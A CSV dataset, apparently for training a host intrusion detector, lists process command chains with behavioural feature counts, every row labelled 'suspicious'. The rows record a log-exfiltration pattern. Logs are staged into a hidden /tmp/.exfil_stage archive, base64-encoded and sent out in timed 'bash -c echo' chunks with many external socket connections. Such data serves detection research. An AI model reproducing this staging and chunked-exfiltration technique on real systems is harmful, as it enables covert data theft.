command_chain,count_read_event,count_write_event,count_sensitive_file_access_fails,count_socket_connect_event_successfully,count_socket_connect_event_fails,count_socket_create_event,count_file_modification_event_successfully,count_file_modification_event_fails,count_file_creation_event,count_link_event,count_symlink_event,count_dir_creation_event,count_dir_remove_event,count_mknod_create_event,count_rename_event,count_auth_event_successfully,count_auth_event_fails,count_passwd_change_event_successfully,count_passwd_change_event_fails,count_user_change_event_successfully,count_user_change_event_fails,count_do_not_update_atime,count_was_modified_time_changed,count_owner_changed,count_group_changed,count_suid_set,count_suid_cleared,count_sgid_set,count_sgid_cleared,count_sticky_set,count_sticky_cleared,count_user_write_added,count_user_write_removed,count_user_read_added,count_user_read_removed,count_user_exec_added,count_user_exec_removed,count_group_write_added,count_group_write_removed,count_group_exec_added,count_group_exec_removed,count_world_write_been_added,count_world_read_been_added,count_world_exec_been_added,count_external_ip,is_priviliged_port,count_sensitive_file,count_is_linked_to_sensitive_file,count_linked_file_SGID_or_SUID,count_atime_flag_been_set,count_modified_time_been_changed,is_current_dir_world_writable,is_target_dir_world_writable,is_in_memory_path,is_cross_user_link,is_dev_backdoor,is_fake_device,argv_has_network,argv_is_ip,argv_has_encoding,argv_is_net_tool,argv_is_sudo,argv_entropy,risk_score,label
./log_collector.sh -> mkdir -p /tmp/.exfil_stage -> tar -czf /tmp/.exfil_stage/data.tar.gz /var/log -> /bin/sh -c gzip -> gzip -> base64 /tmp/.exfil_stage/data.tar.gz -> log_collector.s -> bash -c echo 'H4sIAAAAAAAAA+xdB4ATxfpHEQsiilhRNBaakL3sJptyIooIigoiCCiom -> sleep 0.5 -> bash -c echo 'FEURK4qoiKgPEUHEio0iiNJEwC6C/dn+u5s2uzszO2Vz8PzLe6bdzm++N -> bash -c echo 'UsZ/LuWfT5a1d+Wf8V37LMqi7HKJPp9X+V0URcnXxCGXk6jCv7pMNph2O -> bash -c echo '1391MBpT3stSh6pgr8djpX+P5HXLHq/ynCh5vHITh6ss1Bj+/at/Tf+xY -> bash -c echo 'lGS3uIvpvy4bTzUGPY38r6D/qjKyl9O/C6l/b17/Sh+hqF5U9a/0BP/qv -> bash -c echo 'Mc+pf/uHukDb/537wbTo3Rt329lkEP0rtP9waniNUKYOANv/e32i6BPz4 -> bash -c echo 'NX7JJXmdLskpuhyip9IlV7rdDlUi2bqUI5gO1UZHRjKOaEL5KRZrDns4/ -> bash -c echo 'HvZ6HF0TyUSkm8MteAV3VV00FhahAErxbF3GURuMVTvzYJEwBI4Qpy6RC -> bash -c echo 'S8VREZODJU6pMOqyOhqLZPSqFN11VXWJbJ3ootUkCEaGotcjRXmDFuEla -> bash -c echo 'DoYjDtWXO0RBkgRvDtyr/0bDsRmLSGl0xQwWw1FnQaqWhUtWgipmCeLBy -> bash -c echo 'Y9GqkFffsiXBHXC6cjX5LXktEQtCEWMUNUZXuqQyZDlKPgCdMTHCIQd6r -> bash -c echo 'Trcgab2ARKE8IyINVFGHTCAlVVoVp+cPUCoPg/xioldxPDhquKHHFdyCR -> bash -c echo 'SHqsopLZUEpatizPyiigbC5ObRCYXt050UGfLXTTzMMTpAjoRhdmNTOW5 -> bash -c echo 'N4IdFgTOGZEdlAATglpjtyMJkuiUcprx0PFRW/SkxCAgE+TF5RIHmXBdN -> bash -c echo 'jOJDj0gFVeKGBaTAUyiZjkCYCggep5ueHyMaKUyRF2qAAh9hk3W5BFkQJ -> bash -c echo 'xYscRKpUn1Gpfi723LLgzxeGNS4kAwAUMUaJfqrSAPnRYAJiSooEfEj3g -> bash -c echo 'DW3lbkF0YfpvJCcGPHKgEi/0EOA0nmliKqM6M4qpJYQThsKQiX3j1F+wi -> bash -c echo 'lATPlZH6lIjrQOCcGHHpAYt8cUAVuKyOJmC9m0cIKEAytdkb4YhxijzRI -> bash -c echo '4h7FJ7vo3aoZlxawyBwHVJHLdCRljJKLotNDrSoAiBShxAdF2SLho6MpY -> bash -c echo 'dJrCBdprk5lsIhiPGAUvuTsn4nX5USRsNo9iwQBIg1TkhAWjwFA0Ec06M -> bash -c echo '8TKMP1CghGhFxlhxgCBlMBQTTWFKQWLoyPVgxChgoJKqPMhENpsWjeMRS -> bash -c echo 'qQsrag0l4/FkQmdr6rBGgZEENqaMsFR4Ot7YkIwsmjTGz54IjgCZWaNDA -> bash -c echo 'mfuyYIAMjVb+JLiMvZFL8DuV6QIlLzosIhAdGxTFwUUYZ1U0QbcOg+EBR -> bash -c echo 'aQrNYgqcE+rSHMtaXi4KvDqDCKaciRqDSSvGJCjjS+RagxfDgw6PGEjHC -> bash -c echo 'MyMBnRYhjoEXGgSQlWTcGUmnjeyQztRwXOmR6SF1DDKDgbymG1Lm/s8je -> bash -c echo 'BgF4yofFQrFoJJE1tS/Jh5k/YPiCopLCgbyxAQH8ReqzUnVGyno99luoC -> bash -c echo '03AMrzpUWjiQSzYgHX+qvUum4Y3oUoZIEksrNCCSQ+n5ogUBeYqnRANDU -> bash -c echo 'yA/HF4BKDafjjQkI5C9Vo7rfZNqkNY/P6WbpwE2IpFA6vqhBAJ5ioz1OY -> bash -c echo '8kIHoOMjHpSNixteQeycjihPNMhKdyI7qbkpYVKC6XmihwE4i4fNTkL1p -> bash -c echo 'zYt6aopjAwSkQNLxQosBMJQI1aUzkcwowyY7r+DprHUEouguhCwpHYIRm -> bash -c echo 'nXmzsCArIpPRy6cYNs2g5Gggh0w4cObMc3WbGASAuZmkwzIwmlaejKqRa -> bash -c echo 'NbZqzVXDqysaBJCVUDoiOf1Oo7N3CR7J6WFyJkZIciwdS/QoIFvpZEgyM -> bash -c echo '6diiRwHYykRi0URdvaFTcyv9OWZlB8OTAY8UCGSIDsKn5yYeTARrIpDAv -> bash -c echo '54oeBsKZZFYUF1cSIGVGjkghdNykkjEIK+hxGJYVAIwQRc8HRXmQiXgwn -> bash -c echo 'TccUCw7IXIY1hohjLkMd8YMzx4KjYy7mNoWglFm0oAwnXWjHieUMRKSA0 -> bash -c echo 'U090WB/Hkx6RHErHEzUIwFM2mqhOMs5NMIzpYKnxQO4YkQAW68KRkUb/w -> bash -c echo 'OF7qaJZc4cxQQgDcjM5kjdyo42BZi7RJbD0ViEkJBnLFAlPkLFljmh4qQ -> bash -c echo 'xBcTCsBWJjjSuBOPu8vSofL0WaxAhcVrG88l6ZnlPJdkZpULxYYzYXZRV -> bash -c echo 'X2AiH0DLbwUtTYp4O1MTLntvygFl4tLo4WxjswhsA58MWAVGYdkreL24D -> bash -c echo '4XwshEEOEP5jzTbRUzSkdDKUMoTDCSJISIZAOAIcv5kbaoQCK5mIoUF4h -> bash -c echo 'ZInkRCZaFYs48ycQSn7ZpfAtwVSHJtsEZY0BkE5Tukh+Q2aktnkacqJDm -> bash -c echo 'McQGU+AsG0wbR5Lu3CDbiT6EimKpBEaFUuSFtnyBCZV1pxZJpR29oDgxI -> bash -c echo 'dZJKdVSXE4uA6T5RXOkwqcGKfLHDaOfxVZRgTSRTykUAfbyUqYDscE9eS -> bash -c echo '+fX5WKz33dPIjHUjP1Jk3ID8xxUMArNYuKCUFv0yCE5UHGicazygkJBnm -> bash -c echo '8ZIAyOZuNNJgng0iRcOPaMO0FxQawbkzGomxHWNDiosTjveYHigo5OiUR -> bash -c echo 'uU2X0g2zbPvFOWIuPO6dzX6ilGt0EiI+GIMTCz0I29EegwAQ2xspJUC+S -> bash -c echo '7QiP6hgqdmjHhsRxrlbnSC1nxVQelWuqbnKtXGjcAQSd5RCe/KC0IvbzJ -> bash -c echo '5aCYJsEOblzMhKMbGtMh0OQUpJAIy2IWUixcYHzLdIYmZ3mwjLKxsRxUw -> bash -c echo 'iPwsOE4wDCiMB9qNQsCcyKeVBN3hfqw4GKF4EhYYBGO9J4lSPEybnHBC4 -> bash -c echo 'zsGJigONc+eRQUgWZ78ohUR/kgwnJA40zmNyxlk67gAj7Qyd8jAkdnbOi -> bash -c echo 'lMXGkFmxuDYAm5oX4rgodcMiP3aKb1IMOMwnaI3xG1R+F9oQDkWeGGwUh -> bash -c echo '3n9kHVpnh7Rjr5Ux/oPIg0YgrGw6WlMTSWecqUgiHE3UMBsBY142bAiJA -> bash -c echo '/ogK1o9zwPEewTFF6zHJJ6gj9XSJLPBRekYsrvwcoHCsd0nQiIdv64ZRQ -> bash -c echo 'mZAI2xWyYnHlWTIKhyR7FK2QGDNSYYXFi2lLAi5dXBab5JsqMkubLhwdm -> bash -c echo 'I5rMbVjbYQJiz0MHCsQi1S+NSOizBiOFwgFVEgsLiNFSUGkG6U2FImGhh -> bash -c echo 'eRgSXGHHPTx43Dm8YBsQkdlxWTYf0qTatdx4yARm3nRIB6MTEObQJqV06,0,0,0,174,0,174,0,0,4,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,4,117,0,0,0,0,1,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.58689343958952,6.823300754152663,suspicious
mkdir -p /tmp/.exfil_stage,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.843364815719811,2.0070969533701426,suspicious
tar -czf /tmp/.exfil_stage/data.tar.gz /var/log -> /bin/sh -c gzip -> gzip,0,0,0,4,0,4,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,3,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.8826197041179245,3.6254419227195696,suspicious
/bin/sh -c gzip -> gzip,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.403917277291339,2.3323340362494545,suspicious
gzip,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,1.879964948727111,1.7817061829263552,suspicious
base64 /tmp/.exfil_stage/data.tar.gz,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.939200606937778,1.8824529940353785,suspicious
wc -l,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,1.6729330318733675,1.7641255650833616,suspicious
log_collector.s,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,,,,,,,0.0,suspicious
bash -c echo 'H4sIAAAAAAAAA+xdB4ATxfpHEQsiilhRNBaakL3sJptyIooIigoiCCiom,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.2447340906844824,3.223758566672708,suspicious
sleep 0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.139835523706203,1.803345056685246,suspicious
bash -c echo 'FEURK4qoiKgPEUHEio0iiNJEwC6C/dn+u5s2uzszO2Vz8PzLe6bdzm++N,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.418362911826513,3.227208271649028,suspicious
sleep 0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.139835523706203,1.803345056685246,suspicious
bash -c echo 'UsZ/LuWfT5a1d+Wf8V37LMqi7HKJPp9X+V0URcnXxCGXk6jCv7pMNph2O,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.58689343958952,3.230545339248227,suspicious
sleep 0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.139835523706203,1.803345056685246,suspicious
